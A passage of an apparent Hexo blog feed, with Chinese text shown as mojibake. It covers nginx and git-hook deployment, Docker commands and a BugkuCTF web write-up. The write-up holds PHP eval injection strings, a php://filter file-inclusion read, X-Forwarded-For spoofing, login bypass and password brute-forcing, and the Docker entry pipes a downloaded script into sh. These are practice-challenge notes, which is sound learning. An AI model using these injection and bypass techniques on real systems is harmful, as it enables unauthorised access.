title="é…ç½®nginx"></a>é…ç½®nginx</h2><p>æ‡’çš„é…äº†,ç›´æ¥æŠŠhtmlåˆ äº†<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> /home/git/blog.git html</span><br></pre></td></tr></table></figure></p><p>ä»ä»“åº“å…‹éš†è¿‡æ¥ç›´æ¥æ›¿æ¢æ‰</p><h2 id="é…ç½®Gité’©å­hooks"><a href="#é…ç½®Gité’©å­hooks" class="headerlink" title="é…ç½®Gité’©å­hooks"></a>é…ç½®Gité’©å­hooks</h2><p>blog.gitæ–‡ä»¶å®¶é‡Œæœ‰ä¸€ä¸ªhooksæ–‡ä»¶å¤¹<br>é‡Œè¾¹æœ‰å„ç§hookä¾‹å­<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure></p><p>å†™å¦‚ä¸‹ä»£ç <br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> GIT_DIR <span class="comment">#è¿˜åŸç¯å¢ƒå˜é‡ï¼Œå¦åˆ™ä¼šæ‹‰ä¸åˆ°ä»£ç </span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„è¦chmod 755 blog.git/hooks/post-receive</p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æœ¬åœ°ä¿®æ”¹hexoé…ç½®æ–‡ä»¶<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment"># éƒ¨ç½²åˆ°æˆ‘çš„gitä»“åº“</span></span><br><span class="line">  repo: git@serverip:/home/git/blog.git</span><br><span class="line">  <span class="comment"># åˆ†æ”¯é»˜è®¤master</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></p><ul><li><a href="https://www.jianshu.com/p/59c4fc2684be" target="_blank" rel="noopener">sshå‚è€ƒ</a></li><li><a href="https://www.jianshu.com/p/7cb1a824333e" target="_blank" rel="noopener">nginxå®‰è£…å‚è€ƒ</a></li><li><a href="http://www.runoob.com/linux/nginx-install-setup.html" target="_blank" rel="noopener">nginxé…ç½®å‚è€ƒ</a></li><li><a href="https://www.jianshu.com/p/0c939f63af41" target="_blank" rel="noopener">GitæœåŠ¡å™¨æ­å»ºå‚è€ƒ</a></li><li><a href="https://www.jianshu.com/p/a90d7ee90440" target="_blank" rel="noopener">è¯¦ç»†å‚è€ƒ</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSHéƒ¨ç½²é˜¿é‡Œäº‘vps&quot;&gt;&lt;a href=&quot;#SSHéƒ¨ç½²é˜¿é‡Œäº‘vps&quot; class=&quot;headerlink&quot; title=&quot;SSHéƒ¨ç½²é˜¿é‡Œäº‘vps&quot;&gt;&lt;/a&gt;SSHéƒ¨ç½²é˜¿é‡Œäº‘vps&lt;/h2&gt;&lt;p&gt;ç›´æ¥åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å¯¼å…¥ssh-keygenç”Ÿæˆçš„ç§˜é’¥&lt;br&gt;&lt;a href=&quot;/2018/07/24/git-config/&quot;&gt;ç§˜é’¥ç”Ÿæˆçœ‹è¿™é‡Œ&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh git@serverip -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;å®‰è£…nginx&quot;&gt;&lt;a href=&quot;#å®‰è£…nginx&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…nginx&quot;&gt;&lt;/a&gt;å®‰è£…nginx&lt;/h2&gt;
    
    </summary>
    
      <category term="æ‚ä¸ƒæ‚å…«" scheme="https://t43wiu6.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="web" scheme="https://t43wiu6.github.io/tags/web/"/>
    
      <category term="vps" scheme="https://t43wiu6.github.io/tags/vps/"/>
    
      <category term="nginx" scheme="https://t43wiu6.github.io/tags/nginx/"/>
    
      <category term="ssh" scheme="https://t43wiu6.github.io/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Dockerä»å…¥é—¨åˆ°æ”¾å¼ƒ</title>
    <link href="https://t43wiu6.github.io/2018/10/28/docker-1/"/>
    <id>https://t43wiu6.github.io/2018/10/28/docker-1/</id>
    <published>2018-10-29T06:00:17.000Z</published>
    <updated>2019-12-25T01:28:34.091Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/10/28/docker-1/docker-1-1.png" alt=""></p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><a id="more"></a><p>dockerä¸‰å¤§æ ¸å¿ƒ:</p><ul><li>é•œåƒ -é•œåƒä¸å¯å†™</li><li>å®¹å™¨ -å®¹å™¨åŸºäºé•œåƒç”Ÿæˆ(å¯å†™)</li><li>ä»“åº“ -ä»“åº“å­˜å‚¨é•œåƒ(ç±»ä¼¼äºGitçš„ç®¡ç†æœºåˆ¶)<br><img src="docker-1-2.png" alt=""></li></ul><h2 id="dockerçš„å®‰è£…"><a href="#dockerçš„å®‰è£…" class="headerlink" title="dockerçš„å®‰è£…"></a>dockerçš„å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œå,å°†dockerè´¦æˆ·æ·»åŠ åˆ°ç”¨æˆ·ç»„(éroot)ä»¥ä¾¿æ‰§è¡Œ,ç„¶åç™»å‡ºå†ç™»å½•<br>å¦åˆ™ä¼šæŠ¥no permission</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">newgrp - docker</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¯åŠ¨docker</span></span><br><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•docker</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">èœé¸Ÿæ•™ç¨‹</a></p><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœç´¢é•œåƒ</span></span><br><span class="line">dicker search centos</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½é•œåƒ</span></span><br><span class="line">docker pull name</span><br><span class="line"></span><br><span class="line"><span class="comment"># -t ç»‘å®šä¼ªç»ˆç«¯ -i ä¿æŒæ ‡å‡†è¾“å…¥ -d åå°è¿è¡Œ -p ç«¯å£æ˜ å°„</span></span><br><span class="line">docker run -t -i -p 1000:80 docker.io/centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># å±•ç¤ºæ‰€æœ‰é•œåƒ</span></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜é•œåƒ</span></span><br><span class="line">docker save -o centos7.tar docker.io/centos</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½½å…¥é•œåƒ</span></span><br><span class="line">docker load --input centos7.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">export</span> id &gt; name.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½½å…¥å®¹å™¨æˆä¸ºé•œåƒ</span></span><br><span class="line">cat name.tar | docker import - sherdh/ubuntu:v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨(æ‰€æœ‰)</span></span><br><span class="line">docker ps ï¼ˆ-aï¼‰</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨/ç»ˆæ­¢å®¹å™¨</span></span><br><span class="line">docker start/stop id (-i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤é•œåƒ</span></span><br><span class="line">docker rmi id</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤å®¹å™¨</span></span><br><span class="line">docker rm id</span><br></pre></td></tr></table></figure><h2 id="é‚£äº›æŠ˜è…¾"><a href="#é‚£äº›æŠ˜è…¾" class="headerlink" title="é‚£äº›æŠ˜è…¾"></a>é‚£äº›æŠ˜è…¾</h2><h3 id="ç¬¬ä¸€å‘"><a href="#ç¬¬ä¸€å‘" class="headerlink" title="ç¬¬ä¸€å‘"></a>ç¬¬ä¸€å‘</h3><p>ä¸è¦å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªå­˜åœ¨å®¹å™¨ä¾èµ–çš„é•œåƒ<br>å³ -f ,å› ä¸ºä¼šäº§ç”Ÿå„ç§è«åå…¶å¦™çš„é—®é¢˜<br>å…ˆåˆ é™¤å®¹å™¨,å¦‚æœå®¹å™¨åœ¨è¿è¡Œï¼Œéœ€è¦å…ˆåœæ­¢<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</span></span><br><span class="line">docker ps -a</span><br><span class="line">docker rm å®¹å™¨id</span><br></pre></td></tr></table></figure></p><h3 id="åˆ›å»ºé•œåƒ"><a href="#åˆ›å»ºé•œåƒ" class="headerlink" title="åˆ›å»ºé•œåƒ"></a>åˆ›å»ºé•œåƒ</h3><p>åŸºäºå·²æœ‰å®¹å™¨<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -a <span class="string">"test"</span> -m <span class="string">"add a new file"</span> å®¹å™¨id <span class="built_in">test</span>(æ–°é•œåƒåå­—)</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„æ˜¯å®¹å™¨idï¼Œä¸æ˜¯é•œåƒid</p><h3 id="åŠ tag"><a href="#åŠ tag" class="headerlink" title="åŠ tag"></a>åŠ tag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag <span class="built_in">test</span>:latest <span class="built_in">test</span>/<span class="built_in">test</span>:latest</span><br></pre></td></tr></table></figure><p>åŠ äº†tagåï¼Œæœ‰ä¸¤ä¸ªåŒidçš„images<br>è¿™æ—¶åˆ é™¤é•œåƒæŠ¥é”™<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced <span class="keyword">in</span> multiple repositories</span><br></pre></td></tr></table></figure></p><p>åˆ é™¤æ—¶éœ€è¦æŒ‡å®šåå­—ï¼Œè€Œä¸æ˜¯id</p><h3 id="è¿è¡ŒæŠ¥é”™standard-init-linux-go-178-exec-user-process-caused-â€œexec-format-errorâ€"><a href="#è¿è¡ŒæŠ¥é”™standard-init-linux-go-178-exec-user-process-caused-â€œexec-format-errorâ€" class="headerlink" title="è¿è¡ŒæŠ¥é”™standard_init_linux.go:178: exec user process caused â€œexec format errorâ€"></a>è¿è¡ŒæŠ¥é”™standard_init_linux.go:178: exec user process caused â€œexec format errorâ€</h3><p>æŸ¥åˆ°åŸå› æ˜¯dockerä¸æ”¯æŒ32ä½ubuntuâ€¦<br>ä¹–ä¹–é‡è£…ç³»ç»Ÿå»</p><h2 id="ä½¿ç”¨dockerfileåˆ›å»ºé•œåƒ"><a href="#ä½¿ç”¨dockerfileåˆ›å»ºé•œåƒ" class="headerlink" title="ä½¿ç”¨dockerfileåˆ›å»ºé•œåƒ"></a>ä½¿ç”¨dockerfileåˆ›å»ºé•œåƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER <span class="built_in">test</span> <span class="built_in">test</span>@gmail.com</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">"deb http://archive.ubuntu.com/ubuntu/ raring main universe"</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-server</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">"\ndaemon off;"</span> &gt;&gt; /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå¯åŠ¨</span></span><br><span class="line">RUN bash -c <span class="string">'echo "firefox" &gt;&gt; /.bashrc'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€ç«¯å£</span></span><br><span class="line">EXPOSE 5900</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¹å™¨å¯åŠ¨æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">CMD /usr/sbin/nginx</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/10/28/docker-1/docker-1-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h2&gt;
    
    </summary>
    
      <category term="æ‚ä¸ƒæ‚å…«" scheme="https://t43wiu6.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="docker" scheme="https://t43wiu6.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF-write-up(WEBé¢˜)</title>
    <link href="https://t43wiu6.github.io/2018/09/28/BugkuCTF-write-up/"/>
    <id>https://t43wiu6.github.io/2018/09/28/BugkuCTF-write-up/</id>
    <published>2018-09-29T03:59:43.000Z</published>
    <updated>2018-11-09T21:47:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆæ”¾å‡ºbugkuctfç½‘å€:<a href="http://ctf.bugku.com/" target="_blank" rel="noopener">click me</a></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><a id="more"></a><p>è¿›å»ä¸€å¤§ç‰‡çš„æ»‘ç¨½,é€Ÿåº¦è¿˜è¶Šæ¥è¶Šå¿«<br>f12çœ‹ä¸€ä¸‹ï¼Œå—¯ï¼Œå¾—flag</p><h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>è¦æ±‚è¾“å…¥ä¸¤ä¸ªä¸€ç™¾ä»¥å†…æ•°å­—ç›¸åŠ çš„ç»“æœï¼Œè¾“å…¥æ¡†é™äº†é•¿åº¦<br>å®¡æŸ¥å…ƒç´ æ›´æ”¹maxlength,æäº¤å¾—flag</p><h2 id="webåŸºç¡€-GET"><a href="#webåŸºç¡€-GET" class="headerlink" title="webåŸºç¡€$_GET"></a>webåŸºç¡€$_GET</h2><p>æ˜¾ç¤ºäº†ä»¥ä¸‹ä»£ç <br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">'what'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">'flag'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>ç”¨getä¼ å€¼what=flag</p><h2 id="webåŸºç¡€-POST"><a href="#webåŸºç¡€-POST" class="headerlink" title="webåŸºç¡€$_POST"></a>webåŸºç¡€$_POST</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">'what'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">'flag'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure><p>æ‰“å¼€hackbar<br>postæ•°æ®what=flag</p><h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚num=1å´ä¸æ˜¯æ•°å­—<br>phpç‰¹æ€§ï¼Œæäº¤1a (éšä¾¿åŠ ä¸ªå­—æ¯)</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>æ— é™å¼¹çª—flagå°±åœ¨è¿™é‡Œâ€¦<br><img src="BugkuCTF-web3.png" alt=""><br>æŠ“åŒ…çœ‹ä¸€ä¸‹<br>htmlå®ä½“ç¼–ç ï¼Œè§£ä¸€ä¸‹</p><h2 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h2><p>hint:å¬è¯´æŠŠ flag.bugku.com è§£æåˆ°120.24.86.145 å°±èƒ½æ‹¿åˆ°flag<br>ä¹‹å‰æ˜¯è‡ªå·±å‚»xäº†â€¦.<br>/etc/hosts é‡ŒåŠ ä¸ª123.206.87.240 flag.bugku.comå°±å¥½äº†</p><h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a href="#ä½ å¿…é¡»è®©ä»–åœä¸‹" class="headerlink" title="ä½ å¿…é¡»è®©ä»–åœä¸‹"></a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2><p>ç–¯ç‹‚åˆ·æ–°â€¦..<br><img src="BugkuCTF-stop.png" alt=""><br>æŠ“åŒ…æ‹¦æˆª<br>å¾—flag</p><h2 id="æœ¬åœ°åŒ…å«"><a href="#æœ¬åœ°åŒ…å«" class="headerlink" title="æœ¬åœ°åŒ…å«"></a>æœ¬åœ°åŒ…å«</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>); </span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ„é€ é—­åˆç¬¦å·å°±å¥½äº†<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=); show_source(flag.php</span><br></pre></td></tr></table></figure></p><p>æ²¡ååº”ï¼Œå°´å°¬<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=); <span class="built_in">print</span>(flag.php</span><br></pre></td></tr></table></figure></p><p>æµ‹è¯•ä¸€ä¸‹<br>è¾“å‡ºäº†flagphpï¼Œwtfï¼Ÿè¿‡æ»¤äº†.<br>æ¢ä¸ªæ€è·¯<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=);print_r(file(<span class="string">"flag.php"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸ºåˆæ˜¯ç»•è¿‡ï¼Œè€—äº†å¥½äº›æ—¶é—´â€¦.åæ¥å‘ç°$$<br>phpå…¨å±€å˜é‡GLOBALSï¼Œ$GLOBALSå¯ä»¥è°ƒç”¨ï¼Œæœæ–­?args=GLOBALS<br>get it</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>hint1:jspfuck<br>hint2:å¤§å†™<br>f12çœ‹åˆ°<br><img src="BugkuCTF-web5.png" alt=""><br>æ˜¯jsfuckï¼Œæ§åˆ¶å°é»è´´å›è½¦</p><h2 id="å¤´ç­‰èˆ±"><a href="#å¤´ç­‰èˆ±" class="headerlink" title="å¤´ç­‰èˆ±"></a>å¤´ç­‰èˆ±</h2><p>ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Ÿï¼Ÿï¼Ÿ<br>æŠ“åŒ…çœ‹çœ‹,æœ‰ç‚¹æ„æ€flagåœ¨æ¶ˆæ¯å¤´</p><h2 id="ç½‘ç«™è¢«é»‘"><a href="#ç½‘ç«™è¢«é»‘" class="headerlink" title="ç½‘ç«™è¢«é»‘"></a>ç½‘ç«™è¢«é»‘</h2><p>å—¯..ä¸€ä¸ªé»‘é¡µï¼Œç¿»äº†ç¿»ä»€ä¹ˆéƒ½æ²¡æœ‰<br>ä¸Šç›®å½•æ‰«æå™¨(æˆ‘è¿™é‡Œç”¨dirsearch)ç”¨å¾¡å‰‘çš„äººä¼šæ¯”è¾ƒå¤š<br><img src="BugkuCTF-webshell-dirsearch.png" alt=""><br>æ‰«åˆ°ä¸ªé©¬,å…ˆè®¿é—®çœ‹çœ‹ï¼Œè¦è¾“å¯†ç ï¼Œéšä¾¿è¾“ä¸€ä¸ªè¯•è¯•<br>æç¤ºä¸æ˜¯è‡ªå·±çš„é©¬ä¸è¦ä¹±éª‘â€¦æœ‰ç‚¹æ„æ€<br>æ‹¿burpæŒ‚ä¸ªå­—å…¸ç›´æ¥çˆ†ç ´â€¦<br><img src="BugkuCTF-hack.png" alt=""></p><h2 id="ç®¡ç†å‘˜ç³»ç»Ÿ"><a href="#ç®¡ç†å‘˜ç³»ç»Ÿ" class="headerlink" title="ç®¡ç†å‘˜ç³»ç»Ÿ"></a>ç®¡ç†å‘˜ç³»ç»Ÿ</h2><p>ç™»å½•æ¡†emmmm,è¯•è¯•ä¸‡èƒ½å¯†ç <br><img src="BugkuCTF-1003.png" alt=""><br>è®°å½•ipï¼Œè¿˜çœŸæœ‰ç‚¹å°æ€•æ€•å‘¢~<br>æ’ä¸ªX-Forwarded-For: 123.206.31.85<br>ä¸æŠ¥ç¦æ­¢è®¿é—®äº†ï¼Œç„¶å?å¡äº†ä¸€ä¼šï¼Œf12çœ‹ä¸€ä¸‹<br>æœ‰ä¸ªæ³¨é‡Š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dGVzdDEyMw==</span><br></pre></td></tr></table></figure></p><p>æ˜¯base64ï¼Œè§£ç test123<br>ç›®æµ‹æ˜¯å¯†ç ï¼Œé‚£ç”¨æˆ·åå‘¢?admin?root?administrator?<br>éƒ½ä¸æ˜¯?<br>ä¸å¯¹ï¼Œæ¢ä¸ªæ€è·¯ï¼Œæ”¹X-Forwarded-For: 192.168.1.1<br>å†æ”¹127.0.0.1<br>æˆäº†ï¼Œå’‹å°±å¿˜äº†è¿™ä¸ªå‘¢â€¦.å°´å°¬</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="BugkuCTF-web4.png" alt=""><br>uslè§£ç çœ‹çœ‹ï¼Œä¹±ä¸ƒå…«ç³Ÿï¼Œç†ä¸€ä¸‹æ ¼å¼<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkSubmit</span></span>()&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(unescape(p1) + unescape(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br></pre></td></tr></table></figure></p><p>æ‰‹åŠ¨æ‹¼æ¥å†è§£ç <br>æäº¤67d709b2b54aa2aa648cf6e87a7114f1</p><h2 id="flagåœ¨indexé‡Œ"><a href="#flagåœ¨indexé‡Œ" class="headerlink" title="flagåœ¨indexé‡Œ"></a>flagåœ¨indexé‡Œ</h2><p>click me.<br>ç‚¹ä¹‹ï¼Œè·³è½¬urlæœ‰ä¸œè¥¿<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=show.php</span><br></pre></td></tr></table></figure></p><p>æ˜¯æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥filteråè®®è¯»<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>çœ‹åˆ°äº†â€™//flag:flag{edulcni_elif_lacol_si_siht}â€™</p><h2 id="è¾“å…¥å¯†ç æŸ¥çœ‹flag"><a href="#è¾“å…¥å¯†ç æŸ¥çœ‹flag" class="headerlink" title="è¾“å…¥å¯†ç æŸ¥çœ‹flag"></a>è¾“å…¥å¯†ç æŸ¥çœ‹flag</h2><p>120.24.86.145:8002/baopo/<br>æ—¢ç„¶éƒ½å†™å¾—è¿™ä¹ˆæ˜æ˜ç™½ç™½çš„çˆ†ç ´äº†é‚£å°±çˆ†ç ´å§<br>äº”ä½æ•°æ•°å­—ï¼Œè¦ä¸äº†å¤šä¹…<br>ç¬¬ä¸€æ¬¡æ²¡çˆ†å‡ºæ¥ï¼Ÿï¼Ÿï¼Ÿæ˜¯è‡ªå·±å‚»é€¼äº†ï¼Œè°ƒäº†5é€’å¢â€¦<br>å†çˆ†ä¸€æ¬¡<br><img src="BugkuCTF-baopo.png" alt=""></p><h2 id="ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡"><a href="#ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡" class="headerlink" title="ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡"></a>ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡</h2><p>hints:javascript<br><img src="BugkuCTF-onebillion.png" alt=""><br>f12çœ‹ä¸€ä¸‹<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var clicks=0</span><br><span class="line">$(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">  $(<span class="string">"#cookie"</span>)</span><br><span class="line">    .mousedown(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .mouseup(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">      clicks++;</span><br><span class="line">      $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">      <span class="keyword">if</span>(clicks &gt;= 1000000)&#123;</span><br><span class="line">        var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">        $(<span class="string">'body'</span>).append(form);</span><br><span class="line">        form.submit();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>ä»£ç éƒ½åœ¨è¿™é‡Œæ€ä¹ˆæ”¹éƒ½è¡Œäº†<br>å¤§äº1000000å°±postä¸ªè¡¨å•ã€‚ã€‚<br>æˆ‘å¹²è„†æ„é€ ä¸€ä¸ªpostè¡¨å•æäº¤å°±å¥½äº†</p><h2 